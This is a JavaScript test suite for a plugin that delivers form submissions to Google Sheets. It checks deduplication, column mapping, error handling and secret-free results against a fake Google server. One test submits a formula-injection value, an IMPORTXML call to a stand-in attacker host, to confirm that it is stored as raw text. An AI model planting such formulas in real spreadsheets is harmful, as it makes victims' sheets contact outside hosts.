/**
 * @file Phase-A pins for the Google Sheets form destination (lot G14): the plugin's real
 * `form-destinations/sheets.mjs` module, called with contract-shaped jobs (the forms delivery
 * contract's `deliver` input: kit, fresh credential, frozen form/submission/binding, idempotency
 * key), against an in-memory Sheets grid on the local Google fake. Covers the vertical slice plus
 * the correctness/security pins for this path: duplicate events, a lost append answer, header
 * problems, checkbox groups, added fields, bounded dedupe and its ceiling, product off, reconnect,
 * quota, multiple bindings, frozen config, RAW values, range quoting and safe results.
 *
 * Typed against a LOCAL copy of the contract shape (below), not `form-destinations/types.ts`
 * (owned by the forms-multidest build and not yet carrying `binding`/`idempotencyKey`). Only
 * `fake.fetch` is used as transport; it throws for every non-Google host.
 */
import assert from 'node:assert/strict';
import { after, before, beforeEach, test } from 'node:test';

import destination from '../form-destinations/sheets.mjs';
import { DEDUPE_LIMITS, findSubmissionRows } from '../form-destinations/dedupe.mjs';
import { planColumns } from '../form-destinations/mapping.mjs';
import { startFakeGoogle } from './fake-google-http.mjs';
import { installSheetsGrid } from './fake-sheets-grid.mjs';

/**
 * Local contract shapes (forms-multidest delivery contract §2).
 * @typedef {{ bindingId: string, adapterId: string, connectionRef: string, enabled: boolean, formIds?: readonly string[], config: Readonly<Record<string, unknown>> }} FormDeliveryBinding
 * @typedef {{ ok: true, reference?: string } | { ok: false, error: { code: string, retryable: boolean, retryAfterMs?: number, outcome?: 'not-applied' | 'unknown' } }} FormDeliveryResult
 */

// Built at runtime: not secret-shaped, but unique enough to search results for.
const TOKEN = `fake-access-${'d'.repeat(24)}`;
const BOOK = 'book-one-id';
const OTHER_BOOK = 'book-two-id';
const TAB_ID = 7;
const HEADERS = ['_tovu_submission_id', '_tovu_submitted_at', 'Name', 'Email'];

let fake;
before(async () => { fake = await startFakeGoogle({ clients: {} }); });
beforeEach(() => { fake.reset(); });
after(async () => { await fake.close(); });

const FORM = Object.freeze({
  slug: 'contact',
  fields: [{ name: 'name', required: true, label: 'Name' }, { name: 'email', required: true, label: 'Email', type: 'email' }],
});

/** A kit like the host's: `fetch(url, init, { timeoutMs })`, here over the fake transport. */
function kitOver({ afterResponse } = {}) {
  return {
    timeouts: {},
    now: () => Date.now(),
    async fetch(url, init, options) {
      assert.equal(typeof options.timeoutMs, 'number');
      const response = await fake.fetch({ url }, init);
      await afterResponse?.(url);
      return response;
    },
  };
}

/** @returns {{ kit: object, credential: { token: string, baseUrl: string }, form: object, submission: object, binding: FormDeliveryBinding, idempotencyKey: string }} */
function job({ form = FORM, submission = {}, config = { spreadsheetId: BOOK, tabs: { contact: { sheetId: TAB_ID } } }, bindingId = 'binding-1', kit = kitOver() } = {}) {
  const frozenSubmission = { id: 'sub-1', submittedAt: '2026-10-20T10:00:00.000Z', answers: { name: 'Ada', email: 'ada@example.test' }, ...submission };
  return {
    kit, credential: { token: TOKEN, baseUrl: '' }, form, submission: frozenSubmission,
    binding: { bindingId, adapterId: 'google-sheets', connectionRef: 'conn-1', enabled: true, config },
    idempotencyKey: JSON.stringify([frozenSubmission.id, bindingId]),
  };
}

/** The host's read-only plugin-state reader over these stored settings (what the host hands delivery). */
const stateOf = (products) => Object.freeze({ state: { get: async ({ key }) => (key === 'products' ? products : null) } });
const ON = stateOf({ sheets: true });
/** @returns {Promise<FormDeliveryResult>} */
const deliver = (input, optional = ON) => destination.deliver(input, optional);
const sheetsRequests = () => fake.requests.filter((request) => request.host === 'sheets.googleapis.com');
const appends = () => sheetsRequests().filter((request) => request.path.endsWith(':append'));
const grid = (tabs, spreadsheetId = BOOK) => installSheetsGrid({ fake, spreadsheetId, token: TOKEN, tabs });

test('vertical slice: a fresh tab gets the headers, then one RAW row with the plugin columns', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const result = await deliver(job());
  assert.deepEqual(result, { ok: true, reference: `sheet ${TAB_ID} row 2` });
  assert.deepEqual(sheets.rowsOf(TAB_ID), [HEADERS, ['sub-1', '2026-10-20T10:00:00.000Z', 'Ada', 'ada@example.test']]);
  assert.equal(appends().length, 1);
  assert.equal(appends()[0].query.get('valueInputOption'), 'RAW');
  assert.equal(appends()[0].query.get('insertDataOption'), 'INSERT_ROWS');
});

test('a visitor value that looks like a formula is sent RAW, never USER_ENTERED', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  await deliver(job({ submission: { answers: { name: '=IMPORTXML("https://evil.test")', email: 'a@example.test' } } }));
  const writes = sheetsRequests().filter((request) => request.query.has('valueInputOption'));
  assert.equal(writes.length, 1, 'only the append takes valueInputOption; headers are written as text cells in the column batch');
  assert.ok(writes.every((request) => request.query.get('valueInputOption') === 'RAW'));
  assert.deepEqual(JSON.parse(appends()[0].body).values[0][2], '=IMPORTXML("https://evil.test")');
});

test('answers that are not fields of the frozen form (the source IP among them) are never written', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  await deliver(job({ submission: { answers: { name: 'Ada', email: 'a@example.test', ip: '203.0.113.9', constructor: 'x' } } }));
  assert.ok(!JSON.stringify(sheets.rowsOf(TAB_ID)).includes('203.0.113.9'));
  assert.equal(sheets.rowsOf(TAB_ID)[1].length, 4);
});

test('checkbox groups are joined with ", "', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const form = { slug: 'contact', fields: [...FORM.fields, { name: 'topics', required: false, multiple: true, label: 'Topics', type: 'checkbox' }] };
  await deliver(job({ form, submission: { answers: { name: 'Ada', email: 'a@example.test', topics: ['Pricing', 'Support'] } } }));
  assert.equal(sheets.rowsOf(TAB_ID)[1][4], 'Pricing, Support');
});

test('duplicate events: delivering the same job twice adds one row', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  assert.equal((await deliver(job())).ok, true);
  assert.deepEqual(await deliver(job()), { ok: true, reference: `sheet ${TAB_ID} row 2` });
  assert.equal(appends().length, 1);
  assert.equal(sheets.rowsOf(TAB_ID).length, 2);
});

test('a lost answer after a successful append: the re-scan finds the row, no duplicate on retry', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const timingOut = kitOver({ afterResponse: (url) => { if (url.endsWith(':append?valueInputOption=RAW&insertDataOption=INSERT_ROWS')) throw new Error('timeout'); } });
  assert.deepEqual(await deliver(job({ kit: timingOut })), { ok: true, reference: `sheet ${TAB_ID} row 2` });
  assert.deepEqual(await deliver(job()), { ok: true, reference: `sheet ${TAB_ID} row 2` });
  assert.equal(appends().length, 1);
  assert.equal(sheets.rowsOf(TAB_ID).length, 2);
});

test('a lost append that never landed is outcome-unknown (retryable); the retry scans, then appends once', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const lost = { ...kitOver(), fetch: async (url, init, options) => {
    if (url.includes(':append')) throw new Error('socket hang up');
    return kitOver().fetch(url, init, options);
  } };
  assert.deepEqual(await deliver(job({ kit: lost })), { ok: false, error: { code: 'outcome-unknown', retryable: true, outcome: 'unknown' } });
  assert.equal((await deliver(job())).ok, true);
  assert.equal(sheets.rowsOf(TAB_ID).length, 2);
});

test('a lost append whose re-scan also fails stays outcome-unknown, never reported as delivered', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const lost = { ...kitOver(), fetch: async (url, init, options) => {
    if (!url.includes(':append')) return kitOver().fetch(url, init, options);
    sheets.failNext = { status: 403 };
    throw new Error('socket hang up');
  } };
  assert.deepEqual(await deliver(job({ kit: lost })), { ok: false, error: { code: 'outcome-unknown', retryable: true, outcome: 'unknown' } });
});

test('missing plugin column: a prepared tab whose _tovu_submitted_at header is gone is mapping-invalid and nothing is appended', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: ['_tovu_submission_id', 'Name', 'Email'] } }]);
  assert.deepEqual(await deliver(job()), { ok: false, error: { code: 'mapping-invalid', retryable: false, outcome: 'not-applied' } });
  assert.equal(appends().length, 0);
});

test('markers: the first delivery tags each field column with its field id, in the same atomic batch as the headers', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', columnCount: 2 }]);
  assert.equal((await deliver(job())).ok, true);
  assert.deepEqual(sheets.markersOf(TAB_ID), { name: 2, email: 3 });
  const batches = sheetsRequests().filter((request) => request.path.endsWith(':batchUpdate'));
  assert.deepEqual(batches.map((request) => JSON.parse(request.body).requests.map((entry) => Object.keys(entry)[0])), [['appendDimension', 'updateCells', 'createDeveloperMetadata', 'createDeveloperMetadata']]);
});

test('renamed label: a tagged field keeps its column when the form label and the sheet header both change', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  await deliver(job());
  sheets.tab(TAB_ID).rows.get(1)[2] = 'Contact name';
  const renamed = { slug: 'contact', fields: [{ name: 'name', required: true, label: 'Full name' }, FORM.fields[1]] };
  assert.equal((await deliver(job({ form: renamed, submission: { id: 'sub-2', answers: { name: 'Bo', email: 'bo@example.test' } } }))).ok, true);
  assert.deepEqual(sheets.rowsOf(TAB_ID), [['_tovu_submission_id', '_tovu_submitted_at', 'Contact name', 'Email'], ['sub-1', '2026-10-20T10:00:00.000Z', 'Ada', 'ada@example.test'], ['sub-2', '2026-10-20T10:00:00.000Z', 'Bo', 'bo@example.test']]);
});

test('markers win over headers: a tagged column is used even when another column now carries the label', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: ['_tovu_submission_id', '_tovu_submitted_at', 'Email', 'Name'] }, markers: { name: 2, email: 3 } }]);
  assert.equal((await deliver(job())).ok, true);
  assert.deepEqual(sheets.rowsOf(TAB_ID)[1], ['sub-1', '2026-10-20T10:00:00.000Z', 'Ada', 'ada@example.test']);
});

test('a field tagged on two columns is mapping-invalid and nothing is appended', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: HEADERS } }]);
  sheets.metadata.push({ sheetId: TAB_ID, key: 'tovu_form_field', value: 'name', index: 2 }, { sheetId: TAB_ID, key: 'tovu_form_field', value: 'name', index: 3 });
  assert.equal((await deliver(job())).error.code, 'mapping-invalid');
  assert.equal(appends().length, 0);
});

test('two fields tagged on the same column are mapping-invalid and nothing is appended', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: HEADERS }, markers: { name: 2, email: 2 } }]);
  assert.equal((await deliver(job())).error.code, 'mapping-invalid');
  assert.equal(appends().length, 0);
});

test('a column tagged for one field is never taken by another field with that header: the new field gets its own column', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: HEADERS }, markers: { name: 2, email: 3 } }]);
  const form = { slug: 'contact', fields: [{ name: 'name', required: true, label: 'Full name' }, FORM.fields[1], { name: 'alias', required: false, label: 'Name' }] };
  assert.equal((await deliver(job({ form, submission: { answers: { name: 'Ada', email: 'a@example.test', alias: 'A' } } }))).ok, true);
  assert.deepEqual(sheets.rowsOf(TAB_ID)[1], ['sub-1', '2026-10-20T10:00:00.000Z', 'Ada', 'a@example.test', 'A']);
  assert.deepEqual(sheets.markersOf(TAB_ID), { name: 2, email: 3, alias: 4 });
});

test('marker-keyed metadata on a row (not one column) is ignored', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: HEADERS } }]);
  sheets.metadata.push({ sheetId: TAB_ID, key: 'tovu_form_field', value: 'name', index: 0, dimension: 'ROWS' });
  assert.equal((await deliver(job())).ok, true);
  assert.deepEqual(sheets.rowsOf(TAB_ID)[1], ['sub-1', '2026-10-20T10:00:00.000Z', 'Ada', 'ada@example.test']);
});

test('two rows already holding the submission id: delivered with a review note, never appended again', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: HEADERS, 2: ['sub-1', 't', 'Ada', 'a@example.test'], 3: ['sub-1', 't', 'Ada', 'a@example.test'] } }]);
  assert.deepEqual(await deliver(job()), { ok: true, reference: `sheet ${TAB_ID} rows 2, 3 (duplicate submission id: review)` });
  assert.equal(appends().length, 0);
});

test('a lost column-preparation batch is outcome-unknown and nothing is appended', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const lost = { ...kitOver(), fetch: async (url, init, options) => {
    if (url.includes(':batchUpdate')) sheets.failNext = { status: 503 };
    return kitOver().fetch(url, init, options);
  } };
  assert.deepEqual(await deliver(job({ kit: lost })), { ok: false, error: { code: 'outcome-unknown', retryable: true, outcome: 'unknown' } });
  assert.equal(appends().length, 0);
});

test('duplicated header: a header found twice is mapping-invalid', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: [...HEADERS, 'Email'] } }]);
  assert.equal((await deliver(job())).error.code, 'mapping-invalid');
  assert.equal(appends().length, 0);
});

test('incompatible header row: a first row without _tovu_submission_id is mapping-invalid', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: ['Name', 'Email'] } }]);
  assert.equal((await deliver(job())).error.code, 'mapping-invalid');
  assert.equal(appends().length, 0);
});

test('two fields that would share a header are mapping-invalid', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const form = { slug: 'contact', fields: [{ name: 'a', required: false, label: 'Name' }, { name: 'b', required: false, label: 'Name' }] };
  assert.equal((await deliver(job({ form, submission: { answers: {} } }))).error.code, 'mapping-invalid');
});

test('added fields become new columns at the end (the grid grows); tagged columns keep their header', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', columnCount: 4, rows: { 1: HEADERS, 2: ['sub-0', 't0', 'Bea', 'bea@example.test'] }, markers: { name: 2, email: 3 } }]);
  const form = { slug: 'contact', fields: [{ name: 'name', required: true, label: 'Full name' }, FORM.fields[1], { name: 'company', required: false, label: 'Company' }] };
  assert.equal((await deliver(job({ form, submission: { answers: { name: 'Ada', email: 'a@example.test', company: 'Acme' } } }))).ok, true);
  assert.deepEqual(sheets.rowsOf(TAB_ID), [[...HEADERS, 'Company'], ['sub-0', 't0', 'Bea', 'bea@example.test'], ['sub-1', '2026-10-20T10:00:00.000Z', 'Ada', 'a@example.test', 'Acme']]);
  assert.equal(sheets.tab(TAB_ID).columnCount, 5);
});

test('dedupe scans the id column in bounded chunks and finds an id beyond the first chunk', async () => {
  const rowCount = DEDUPE_LIMITS.chunkRows * 2 + 2;
  grid([{ sheetId: TAB_ID, title: 'Contact form', rowCount, rows: { 1: HEADERS, [rowCount]: ['sub-1', 't', 'Ada', 'a@example.test'] } }]);
  assert.deepEqual(await deliver(job()), { ok: true, reference: `sheet ${TAB_ID} row ${rowCount}` });
  const scans = sheetsRequests().filter((request) => request.method === 'GET' && decodeURIComponent(request.path).includes("'!A"));
  assert.deepEqual(scans.map((request) => decodeURIComponent(request.path).split('!')[1]), ['A2:A5001', 'A5002:A10001', 'A10002:A10002']);
  assert.equal(appends().length, 0);
});

test('scan-limit failure: a tab past the 50,000-row ceiling is destination-limit and is never appended to', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form', rowCount: DEDUPE_LIMITS.maxScannedRows + 2, rows: { 1: HEADERS } }]);
  assert.deepEqual(await deliver(job()), { ok: false, error: { code: 'destination-limit', retryable: false, outcome: 'not-applied' } });
  assert.equal(appends().length, 0);
});

test('product disabled (or no plugin-state reader wired): adapter-unavailable, retryable, nothing sent to Google', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const refused = { ok: false, error: { code: 'adapter-unavailable', retryable: true, outcome: 'not-applied' } };
  assert.deepEqual(await deliver(job(), stateOf({ sheets: false })), refused);
  assert.deepEqual(await deliver(job(), {}), refused);
  assert.deepEqual(await deliver(job(), stateOf(null)), refused);
  assert.deepEqual(await deliver(job(), stateOf({ sheets: 'true' })), refused);
  assert.equal(fake.requests.length, 0);
});

test('an unexpected host error is a retryable delivery-failed whose text is dropped', async () => {
  const result = await deliver(job(), { state: { get: async () => { throw new Error(`reader failed for ${TOKEN}`); } } });
  assert.deepEqual(result, { ok: false, error: { code: 'delivery-failed', retryable: true } });
});

test('existing columns in another order: each value lands under its own header', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: ['Email', '_tovu_submitted_at', 'Name', '_tovu_submission_id'] } }]);
  assert.equal((await deliver(job())).ok, true);
  assert.deepEqual(sheets.rowsOf(TAB_ID)[1], ['ada@example.test', '2026-10-20T10:00:00.000Z', 'Ada', 'sub-1']);
});

test('reconnect required: Google refusing the token is authorization-required, not retried, nothing appended', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const stale = { ...job(), credential: { token: 'fake-access-revoked', baseUrl: '' } };
  assert.deepEqual(await deliver(stale), { ok: false, error: { code: 'authorization-required', retryable: false, outcome: 'not-applied' } });
  assert.equal(appends().length, 0);
});

test('quota: a long Retry-After is rate-limited with retryAfterMs, never dropped', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  sheets.failNext = { status: 429, headers: { 'retry-after': '30' } };
  assert.deepEqual(await deliver(job()), { ok: false, error: { code: 'rate-limited', retryable: true, outcome: 'not-applied', retryAfterMs: 30_000 } });
});

test('multiple bindings: each spreadsheet gets its row; an ungranted spreadsheet fails alone', async () => {
  const first = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const second = grid([{ sheetId: 3, title: 'Leads' }], OTHER_BOOK);
  const secondConfig = { spreadsheetId: OTHER_BOOK, tabs: { contact: { sheetId: 3 } } };
  const ungranted = { spreadsheetId: 'book-not-granted', tabs: { contact: { sheetId: 1 } } };
  const results = await Promise.all([deliver(job()), deliver(job({ bindingId: 'binding-2', config: secondConfig })), deliver(job({ bindingId: 'binding-3', config: ungranted }))]);
  assert.deepEqual(results.map((result) => result.ok || result.error.code), [true, true, 'resource-not-granted']);
  assert.equal(first.rowsOf(TAB_ID).length, 2);
  assert.equal(second.rowsOf(3).length, 2);
});

test('frozen config: a deep-frozen job is delivered unchanged, to the tab by sheet id even after a rename', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const deepFreeze = (value) => { if (value && typeof value === 'object') { Object.values(value).forEach(deepFreeze); Object.freeze(value); } return value; };
  const { kit, ...rest } = job();
  const frozen = { kit, ...deepFreeze(rest) };
  sheets.tab(TAB_ID).title = "Renamed 'tab'";
  assert.equal((await deliver(frozen)).ok, true);
  assert.equal(sheets.rowsOf(TAB_ID).length, 2);
  assert.ok(appends()[0].path.includes(encodeURIComponent("'Renamed ''tab'''!A1")));
});

test('configuration-invalid when the binding names no tab for this form', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  assert.deepEqual(await deliver(job({ config: { spreadsheetId: BOOK, tabs: {} } })), { ok: false, error: { code: 'configuration-invalid', retryable: false, outcome: 'not-applied' } });
  assert.equal(fake.requests.length, 0);
});

test('results never carry the token, answers or tab titles', async () => {
  grid([{ sheetId: TAB_ID, title: 'Secret tab title' }]);
  const outputs = [await deliver(job()), await deliver({ ...job(), credential: { token: 'fake-access-revoked', baseUrl: '' } })];
  const text = JSON.stringify(outputs);
  for (const needle of [TOKEN, 'fake-access-revoked', 'Ada', 'ada@example.test', 'Secret tab title']) assert.ok(!text.includes(needle), needle);
});

// ---------------------------------------------------------------------------------------------
// Phase C: contract completion (failure mapping, answer shapes, header/label rules, odd answers)
// ---------------------------------------------------------------------------------------------

const PREFIX = `/v4/spreadsheets/${BOOK}`;
const HEADER_PATH = `${PREFIX}/values/${encodeURIComponent("'Contact form'!1:1")}`;
const APPEND_PATH = `${PREFIX}/values/${encodeURIComponent("'Contact form'!A1")}:append`;
const batches = () => sheetsRequests().filter((request) => request.path.endsWith(':batchUpdate')).map((request) => JSON.parse(request.body).requests);

/** `[status, Google body, contract code, retryable]` for a failure on the first request (the tab read). */
const FAILURE_CODES = [
  [403, { error: { code: 403, errors: [{ reason: 'insufficientPermissions' }] } }, 'authorization-required', false],
  [403, { error: { code: 403 } }, 'resource-not-granted', false],
  [403, { error: { code: 403, errors: [{ reason: 'domainPolicy' }] } }, 'resource-not-granted', false],
  [404, undefined, 'resource-not-granted', false],
  [400, undefined, 'mapping-invalid', false],
  // A status the plugin has no code for is unexpected-response: reported, not retried.
  [418, undefined, 'delivery-failed', false],
];
for (const [status, body, code, retryable] of FAILURE_CODES) {
  test(`failure mapping: Google ${status} ${JSON.stringify(body?.error?.errors ?? '')} on the tab read is ${code} (retryable: ${retryable}), nothing appended`, async () => {
    const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
    sheets.failNext = { status, ...(body ? { body } : {}) };
    assert.deepEqual(await deliver(job()), { ok: false, error: { code, retryable, outcome: 'not-applied' } });
    assert.equal(appends().length, 0);
  });
}

test('failure mapping: a 409 conflict with a long Retry-After is a retryable delivery-failed that keeps retryAfterMs', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  sheets.failNext = { status: 409, headers: { 'retry-after': '40' } };
  assert.deepEqual(await deliver(job()), { ok: false, error: { code: 'delivery-failed', retryable: true, outcome: 'not-applied', retryAfterMs: 40_000 } });
});

test('failure mapping: a refused append (400) is mapping-invalid and is not re-scanned as if uncertain', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  fake.route({ method: 'POST', path: APPEND_PATH }, () => [400, { error: { code: 400 } }]);
  assert.deepEqual(await deliver(job()), { ok: false, error: { code: 'mapping-invalid', retryable: false, outcome: 'not-applied' } });
  // tab, header row, markers, dedupe scan, column batch, append: no second tab read for a re-scan.
  assert.equal(sheetsRequests().filter((request) => request.method === 'GET' && request.path === PREFIX).length, 1);
});

test('a 401 with an unchanged cached token requires authorization and appends no row', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  sheets.failNext = { status: 401 };
  let reads = 0;
  const credential = { baseUrl: '', getAccessToken: async () => { reads += 1; return TOKEN; } };
  assert.deepEqual(await deliver({ ...job(), credential }), { ok: false, error: { code: 'authorization-required', retryable: false, outcome: 'not-applied' } });
  assert.equal(appends().length, 0);
  assert.equal(reads, 2);
  assert.equal(sheetsRequests().length, 1);
});

test('OAuth credential: a host credential with getAccessToken is asked for a fresh token before every Google request', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  let reads = 0;
  const credential = { baseUrl: '', getAccessToken: async () => { reads += 1; return TOKEN; } };
  assert.equal((await deliver({ ...job(), credential })).ok, true);
  assert.equal(reads, sheetsRequests().length);
  assert.ok(reads >= 5);
});

for (const [why, config] of [
  ['no config at all', undefined],
  ['a spreadsheet id that is not text', { spreadsheetId: 7, tabs: { contact: { sheetId: TAB_ID } } }],
  ['a negative tab id', { spreadsheetId: BOOK, tabs: { contact: { sheetId: -1 } } }],
  ['a tab id that is not an integer', { spreadsheetId: BOOK, tabs: { contact: { sheetId: '7' } } }],
  ['a tab entry inherited from the prototype, not the binding', { spreadsheetId: BOOK, tabs: Object.create({ contact: { sheetId: TAB_ID } }) }],
]) {
  test(`configuration-invalid for ${why}, before any request`, async () => {
    // Built by hand: `job()`'s default would replace an undefined config.
    const base = job();
    const input = { ...base, binding: { ...base.binding, config } };
    assert.deepEqual(await deliver(input), { ok: false, error: { code: 'configuration-invalid', retryable: false, outcome: 'not-applied' } });
    assert.equal(fake.requests.length, 0);
  });
}

test('a tab that was deleted from the spreadsheet is configuration-invalid (pick the tab again), nothing appended', async () => {
  grid([{ sheetId: 99, title: 'Other' }]);
  assert.deepEqual(await deliver(job()), { ok: false, error: { code: 'configuration-invalid', retryable: false, outcome: 'not-applied' } });
  assert.equal(appends().length, 0);
});

test('a metadata answer naming no tabs at all is configuration-invalid', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  fake.route({ method: 'GET', path: PREFIX }, () => [200, {}]);
  assert.deepEqual(await deliver(job()), { ok: false, error: { code: 'configuration-invalid', retryable: false, outcome: 'not-applied' } });
});

test('a tab answered without a grid size counts as empty: columns are added for every header and the row is appended', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  fake.route({ method: 'GET', path: PREFIX }, () => [200, { sheets: [{ properties: { sheetId: TAB_ID, title: 'Contact form' } }] }]);
  assert.equal((await deliver(job())).ok, true);
  assert.deepEqual(batches()[0][0], { appendDimension: { sheetId: TAB_ID, dimension: 'COLUMNS', length: 4 } });
  assert.equal(appends().length, 1);
});

test('a header-row read answered without values counts as a fresh tab', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  fake.route({ method: 'GET', path: HEADER_PATH }, () => [200, { range: "'Contact form'!A1:Z1" }]);
  assert.deepEqual(await deliver(job()), { ok: true, reference: `sheet ${TAB_ID} row 2` });
  assert.deepEqual(sheets.rowsOf(TAB_ID)[0], HEADERS);
});

test('a marker search answered without a match list counts as no markers: every field column gets tagged', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  fake.route({ method: 'POST', path: `${PREFIX}/developerMetadata:search` }, () => [200, {}]);
  assert.equal((await deliver(job())).ok, true);
  assert.deepEqual(sheets.markersOf(TAB_ID), { name: 2, email: 3 });
});

test('an append answer naming no updated range is delivered with the tab as the reference (no row number guessed)', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  fake.route({ method: 'POST', path: APPEND_PATH }, () => [200, {}]);
  assert.deepEqual(await deliver(job()), { ok: true, reference: `sheet ${TAB_ID}` });
});

test('labels: a missing or blank label falls back to the field id, and a label is trimmed', async () => {
  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const form = { slug: 'contact', fields: [{ name: 'phone' }, { name: 'note', label: '   ' }, { name: 'city', label: '  City ' }] };
  assert.equal((await deliver(job({ form, submission: { answers: { phone: '1', note: 'n', city: 'c' } } }))).ok, true);
  assert.deepEqual(sheets.rowsOf(TAB_ID)[0], ['_tovu_submission_id', '_tovu_submitted_at', 'phone', 'note', 'City']);
});

test('answers: null and absent answers are blank cells, numbers and booleans keep their type in the RAW row', async () => {
  grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
  const form = { slug: 'contact', fields: [...FORM.fields, { name: 'agree', label: 'Agree' }, { name: 'extra', label: 'Extra' }] };
  await deliver(job({ form, submission: { answers: { name: null, email: 42, agree: true } } }));
  assert.deepEqual(JSON.parse(appends()[0].body).values[0].slice(2), ['', 42, true, '']);
});

test('dedupe: blank and malformed id cells are skipped and a padded id still matches', async () => {
  const reads = [];
  const found = await findSubmissionRows({ rowCount: 6, submissionId: 'sub-1', readColumn: async (range) => { reads.push(range); return [['other'], [], null, ['  sub-1 ']]; } });
  assert.deepEqual(found, [5]);
  assert.deepEqual(reads, [{ from: 2, to: 6 }]);
});

test('mapping: a null cell in the header row counts as blank, so the headers around it keep their positions', () => {
  const mapping = [{ header: '_tovu_submission_id', source: 'id' }, { header: 'Name', field: 'name' }];
  const layout = planColumns({ mapping, headerRow: ['_tovu_submission_id', null, 'Name'], markers: new Map() });
  assert.deepEqual(layout.columns, [0, 2]);
  assert.deepEqual(layout.newHeaders, []);
});

test('mapping: a header row of only null cells is a fresh tab, so every header is written', () => {
  const mapping = [{ header: '_tovu_submission_id', source: 'id' }, { header: 'Name', field: 'name' }];
  const layout = planColumns({ mapping, headerRow: [null, null], markers: new Map() });
  assert.deepEqual(layout.newHeaders, [{ index: 0, header: '_tovu_submission_id' }, { index: 1, header: 'Name' }]);
});
